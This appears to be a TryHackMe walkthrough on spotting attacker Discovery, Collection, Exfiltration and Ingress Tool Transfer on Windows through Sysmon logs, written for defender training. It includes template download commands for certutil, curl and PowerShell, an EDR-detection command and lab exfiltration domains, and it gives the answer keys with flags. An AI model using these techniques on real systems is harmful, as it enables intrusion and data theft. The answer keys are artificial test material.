---
icon: windows
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1749505706160
coverY: 0
coverHeight: 138
---

# Windows Threat Detection 2

**Date:** 01.05.2026

**Room Category:** Walkthrough&#x20;

**Core Concept:** Analyzing post-breach threat actor behavior on Windows environments, focusing specifically on Discovery, Collection, Exfiltration, and Ingress Tool Transfer.

After gaining Initial Access, threat actors generally face a choice: establish a quiet backdoor for long-term persistence or take immediate action to map the network and steal data. This document outlines the post-compromise attack phases, detailing how adversaries explore unfamiliar environments and how defenders can detect these activities using Windows event logs and Sysmon.

***

## Task 1: Introduction

The primary objective is to detect and analyze the initial steps threat actors take immediately following a successful Windows breach. This includes identifying Discovery techniques, tracing attack origins by reconstructing process trees, understanding data Collection targets, and analyzing Ingress Tool Transfer commands.

Question: Let's start!

> **Answer:** No answer needed

***

## Task 2: Discovery Overview

<figure><img src="../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

When a threat actor first breaches a system via a phishing payload or exposed service, they land in an unfamiliar environment. To understand their current context, assess the value of the host, and identify active security controls, they must perform Situational Awareness. This is mapped to the MITRE Discovery tactic.

**Common Discovery Targets & Commands:**

<figure><img src="../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

* **Files and Folders:** To understand the victim's role or find sensitive documents (`type`, `Get-Content`, `dir`).
* **Users and Groups:** To determine current privilege levels and identify local administrators (`whoami`, `net user`, `query user`).
* **System and Apps:** To find running applications that could be exploited or holding sensitive data in memory (`tasklist /v`, `systeminfo`, `wmic product`).
* **Network Settings:** To map the internal corporate network architecture (`ipconfig /all`, `netstat -ano`).
* **Active Antivirus:** To gauge the risk of executing further payloads without being blocked (`Get-WmiObject` querying the SecurityCenter2 namespace).

Question: Open CMD and type "net user Administrator". Which privileged group does the user belong to?

> **Answer:** Administrators

Question: Open Event Viewer and try to find your command in Sysmon logs. What is the "Image" field of the net command you just run?

> **Answer:** C:\Windows\System32\net.exe

***

## Task 3: Detecting Discovery

Discovery commands are typically executed via the command line because tools like `whoami` and `ipconfig` are natively available on all Windows machines. This "Living off the Land" approach is convenient for attackers but highly visible to defenders.

**Detection Methodology:**

<figure><img src="../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

* **Command Line Execution:** Most launched commands are logged as new processes. Utilizing Sysmon Event ID 1 (Process Creation), defenders can reconstruct the process tree by correlating the `ProcessId` and `ParentProcessId` fields. A typical malicious tree might show `explorer.exe` spawning a phishing payload (`invoice.pdf.exe`), which then spawns `cmd.exe` to execute discovery commands.
* **Graphical Interface Discovery:** If the attacker has interactive RDP access, they may use graphical tools rather than command-line utilities. In these cases, the process tree will feature administrative binaries like `mmc.exe` (Computer Management), `control.exe` (Control Panel), and `taskmgr.exe` (Task Manager).

Question: Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?

> **Answer:** whoami

Question: Which command did the malware use to check the presence of MS Defender EDR?

> **Answer:** cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"

Question: To which domain did the malware send the discovered data?

> **Answer:** exfil.beecz.cafe

***

## Task 4: Collection Overview

<figure><img src="../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

Following Discovery, the attacker moves to the Collection and Exfiltration phases. The goal is to identify and package valuable data, ranging from personal files to corporate secrets and authentication material.

**Primary Collection Targets:**

* **Personal Data:** Chat histories (Signal, Telegram) and browser history for blackmail.
* **Financial Data:** Web banking session cookies and cryptocurrency wallets (`wallet.dat`).
* **Corporate Secrets:** Databases and SSH keys (`.ssh` directory) to enable lateral movement across the enterprise.

**Exfiltration Strategies:** To bypass network monitoring and avoid raising suspicion, attackers frequently exfiltrate stolen data to trusted, legitimate cloud storage services such as DropBox, Mega, Amazon S3, or GitHub. They may also register typo-squatted domains (e.g., `windows-updates.com`) that blend in with normal administrative network traffic.

Question: What is the Facebook password that the user saved in Chrome?

> **Answer:** nsAghv51BBav90!

Question: Which interesting SSH key does the user store on disk?

> **Answer:** thm-access-database.key

Question: What is the secret PDF file explaining TryHackMe's internal network?

> **Answer:** thm-network-diagram-2025.pdf

***

## Task 5: Detecting Collection

Detecting human-driven Collection relies on tracking process creation events associated with file access and archiving. Commands like `notepad.exe secrets.txt` or archiving utilities like `7za.exe a -tzip` strongly indicate data staging.

<figure><img src="../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

**Automated Data Stealers:** In environments where human attackers are less active (such as personal workstations), automated data stealers (like the Gremlin stealer) are deployed. These specialized malware strains are designed to silently harvest VPN profiles, browser sessions, and cryptocurrency wallets.

* **Detection Challenge:** Data stealers often rely heavily on direct API calls rather than spawning new `cmd.exe` or PowerShell processes. Therefore, detection must pivot from command-line monitoring to analyzing anomalous file creations (e.g., staging directories created in `C:\Temp`), unauthorized clipboard access, and suspicious outbound network connections to external storage buckets.

Question: Looking at Sysmon logs, what directory does the stealer create?

> **Answer:** staging\_58f1

Question: Which three file extensions does the malware search for?

> **Answer:** docx, pdf, xlsx

Question: Which PowerShell cmdlet does the malware use to get clipboard content?

> **Answer:** Get-ClipBoard

Question: Which domain does the malware exfiltrate the data to?

> **Answer:** collecteddata-storage-2025.s3.amazonaws.com

***

## Task 6: Ingress Tool Transfer

Threat actors rarely package all their tools into the initial phishing attachment to minimize their footprint and evade antivirus detection. Instead, they rely on Ingress Tool Transfer to download additional utilities (such as Seatbelt, Mimikatz, or Remcos RAT) only when required.

<figure><img src="../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

**Common Transfer Mechanisms:** Attackers frequently abuse built-in Windows utilities (Living off the Land binaries) to download their secondary payloads:

* **Certutil:** `certutil.exe -urlcache -f [URL] [Output]`
* **Curl:** `curl.exe [URL] -o [Output]`
* **PowerShell:** `powershell -c "Invoke-WebRequest -Uri [URL] -OutFile [Output]"`

**Detection Strategies:** Because these native tools are also used by IT administrators, context is critical. Defenders must track the parent process initiating the download and inspect the destination domain. A network connection originating from `certutil.exe` or `curl.exe` spawned by an untrusted parent process warrants immediate investigation.

Question: Open the Chrome browser on the VM and navigate to the URL. What is the flag in the response?

> **Answer:** THM{just\_use\_web\_browser}

Question: Next, open CMD and download the file from the same URL using curl.exe. What is the flag in the response?

> **Answer:** THM{curl\_is\_cool}

Question: Continue with the same CMD and URL, but now using certutil.exe. What is the flag in the response?

> **Answer:** THM{abusing\_certutil}

Question: Finally, download the same file using PowerShell IWR. What is the flag in the response?

> **Answer:** THM{power\_of\_powershell}

***

## Conclusion

A thorough understanding of the post-exploitation lifecycle is vital. Discovery typically occurs immediately after Initial Access and provides highly visible telemetry in Sysmon. Attackers dynamically download new tools via Ingress Tool Transfer only when necessary, minimizing their exposure. Efficient alert triage requires correlating process creation events with subsequent network connections and file modifications to fully map the attacker's trajectory.
